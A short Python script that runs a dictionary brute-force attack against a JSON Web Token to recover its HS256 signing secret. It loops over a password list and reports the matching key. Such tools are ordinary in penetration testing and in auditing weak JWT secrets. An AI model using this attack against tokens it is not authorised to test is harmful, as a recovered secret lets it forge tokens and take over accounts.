#!/usr/bin/env python

__author__ = "Pascal Schulz"
__copyright__ = "Copyright 2017, Dynatrace Austria GmbH"
__version__ = "0.1"
__license__ = "MIT"

import jwt
from termcolor import cprint
import argparse
import os

if __name__ == "__main__":

    parser = argparse.ArgumentParser(description='This script runs a brute force attack against'
                                                 ' a JSON web token to detect the HS256 secret\n\n',
                                     formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('t', metavar='jwtToken', help='insert JSON web token', type=str)
    parser.add_argument('d', metavar="dictionary", help='insert dictionary with passwords')
    args = parser.parse_args()

    jwtToken = args.t
    if os.path.exists(args.d):
        passwordList = open(args.d, "r")

        for password in passwordList:
            try:
                passwd = jwt.decode(jwtToken, password.rstrip(), algorithms=['HS256'])
                cprint("Correct password found: {}".format(password.rstrip()), "green", "on_white")
                break
            except jwt.InvalidTokenError:
                cprint("Incorrect password: {}".format(password.rstrip()), "red", "on_white")
            except:
                cprint("Fatal exception occured", "grey", "on_white")
    else:
        cprint("Dictionary provided is not a file.", "grey", "on_white")






